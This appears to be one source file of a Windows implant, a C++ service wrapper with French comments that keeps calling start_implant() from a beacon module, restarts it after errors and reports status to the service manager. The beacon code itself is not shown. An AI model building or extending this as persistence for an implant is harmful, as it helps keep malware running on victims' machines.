#include "service.h"
#include "beacon.h"
#include "config.h"
#include "log.h"
#include <windows.h>
#include <exception>
#include <string>

namespace {

SERVICE_STATUS_HANDLE g_status_handle = nullptr;
SERVICE_STATUS        g_status{};
HANDLE                g_stop_event = nullptr;

DWORD WINAPI service_ctrl_handler(DWORD control, DWORD, LPVOID, LPVOID) {
    switch (control) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        if (g_status.dwCurrentState == SERVICE_RUNNING) {
            g_status.dwCurrentState = SERVICE_STOP_PENDING;
            g_status.dwWaitHint = 10000;
            SetServiceStatus(g_status_handle, &g_status);
        }
        if (g_stop_event) {
            SetEvent(g_stop_event);
        }
        return NO_ERROR;

    case SERVICE_CONTROL_INTERROGATE:
        SetServiceStatus(g_status_handle, &g_status);
        return NO_ERROR;

    default:
        return ERROR_CALL_NOT_IMPLEMENTED;
    }
}

void update_status(DWORD state, DWORD exit_code = NO_ERROR) {
    g_status.dwServiceType   = SERVICE_WIN32_OWN_PROCESS;
    g_status.dwCurrentState  = state;
    g_status.dwWin32ExitCode = exit_code;
    g_status.dwControlsAccepted =
        (state == SERVICE_RUNNING)
            ? (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN)
            : 0;
    // Retour 1 : incrémenter dwCheckPoint sur tout état PENDING
    // pour que le SCM ne considère pas le service bloqué.
    if (state == SERVICE_RUNNING || state == SERVICE_STOPPED) {
        g_status.dwCheckPoint = 0;
        g_status.dwWaitHint   = 0;
    } else {
        ++g_status.dwCheckPoint;
        g_status.dwWaitHint = 10000;  // 10 s max entre deux checkpoints
    }
    SetServiceStatus(g_status_handle, &g_status);
}

void WINAPI service_main(DWORD, LPWSTR*) {
    // Retour 2 : initialiser g_status avant RegisterServiceCtrlHandlerExW
    // pour qu'un INTERROGATE reçu pendant le démarrage retourne un état valide
    // (SERVICE_WIN32_OWN_PROCESS / START_PENDING) et non dwServiceType=0 / STOPPED.
    g_status.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
    g_status.dwCurrentState     = SERVICE_START_PENDING;
    g_status.dwControlsAccepted = 0;
    g_status.dwCheckPoint       = 0;
    g_status.dwWaitHint         = 10000;

    g_status_handle = RegisterServiceCtrlHandlerExW(
        ServiceNameW, service_ctrl_handler, nullptr);
    if (!g_status_handle) {
        return;
    }

    update_status(SERVICE_START_PENDING);
    if (!stop_event()) {
        update_status(SERVICE_STOPPED, GetLastError());
        return;
    }

    update_status(SERVICE_RUNNING);
    log_line("service demarre");

    // Boucle équivalente à l'ancien main(), mais interrompable.
    while (WaitForSingleObject(g_stop_event, 0) == WAIT_TIMEOUT) {
        try {
            start_implant();   // bloque jusqu'à stop_event (voir beacon.cpp)
        }
        catch (const std::exception& e) {
            log_line(std::string("exception: ") + e.what());
        }
        catch (...) {
            log_line("exception inconnue");
        }

        // Pause entre deux tentatives, interrompue par stop_event.
        WaitForSingleObject(g_stop_event, 5000);
    }

    log_line("service arret demande");
    update_status(SERVICE_STOP_PENDING);
    CloseHandle(g_stop_event);
    g_stop_event = nullptr;
    update_status(SERVICE_STOPPED);
}

}  // namespace

HANDLE stop_event() {
    if (!g_stop_event) {
        g_stop_event = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    }
    return g_stop_event;
}

void request_self_stop() {
    HANDLE ev = stop_event();
    if (ev) {
        SetEvent(ev);
    }
}

int run_as_service() {
    SERVICE_TABLE_ENTRYW table[] = {
        { const_cast<LPWSTR>(ServiceNameW), service_main },
        { nullptr, nullptr }
    };

    if (!StartServiceCtrlDispatcherW(table)) {
        const DWORD err = GetLastError();
        // 1063 = ERROR_FAILED_SERVICE_CONTROLLER_CONNECT :
        // on n'a pas été lancé par le SCM (ex: exe lancé à la main sans --install).
        if (err == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
            log_line("lance sans le SCM, passage en mode console / installateur");
        }
        return static_cast<int>(err);
    }
    return 0;
}